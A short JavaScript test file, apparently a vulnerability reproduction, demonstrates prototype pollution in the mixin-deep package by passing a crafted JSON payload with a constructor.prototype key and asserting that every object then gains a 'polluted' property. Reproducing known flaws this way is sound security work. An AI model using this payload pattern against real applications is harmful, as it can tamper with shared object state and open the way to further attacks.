//https://snyk.io/vuln/SNYK-JS-MIXINDEEP-450212
test("prototype pollution in mixin-deep ", () => {
  const mixin = require("mixin-deep");
  const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';

  let obj = {};

  expect({}.polluted).toBe(undefined);

  mixin({}, JSON.parse(payload));
  expect({}.polluted).toBe("yes");
});
